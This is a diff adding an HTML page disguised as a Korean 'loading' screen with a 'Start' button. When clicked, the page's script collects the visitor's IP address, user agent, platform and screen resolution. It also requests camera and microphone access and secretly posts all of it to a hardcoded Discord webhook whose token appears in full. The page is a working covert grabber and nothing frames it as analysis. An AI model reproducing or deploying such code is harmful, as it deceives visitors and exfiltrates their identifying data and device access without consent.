@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>로딩중</title>
+</head>
+<body>
+  <h2>로딩중</h2>
+  <p>계속하시려면 눌러주세요.</p>
+  <button id="agreeBtn">시작</button>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1393919110005653615/RgqRu8hW5dng4M3y7tp0o_67LhxuaaUYJnSxrXcjJJMWfkuR4JpU-lNCR8PCrL6mxU2e";
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return 'IP 가져오기 실패';
+      }
+    }
+
+    async function collectAndSendInfo() {
+      const ip = await getIPInfo();
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const screenRes = `${screen.width}x${screen.height}`;
+      let mediaPermission = '요청 안됨';
+
+      // 카메라/마이크 권한 요청
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        mediaPermission = '허용됨';
+      } catch (e) {
+        mediaPermission = '거부됨 또는 오류';
+      }
+
+      const payload = {
+        content: "**[사용자 정보 수집 결과]**",
+        embeds: [{
+          title: "📋 사용자 정보",
+          color: 0x00FFFF,
+          fields: [
+            { name: "🌐 IP", value: ip, inline: true },
+            { name: "🖥️ User-Agent", value: ua, inline: false },
+            { name: "💻 Platform", value: platform, inline: true },
+            { name: "📺 화면 해상도", value: screenRes, inline: true },
+            { name: "🎤 미디어 권한", value: mediaPermission, inline: true }
+          ],
+          timestamp: new Date()
+        }]
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    document.getElementById('agreeBtn').addEventListener('click', () => {
+      alert("로딩중");
+      collectAndSendInfo();
+    });
+  </script>
+</body>
+</html>
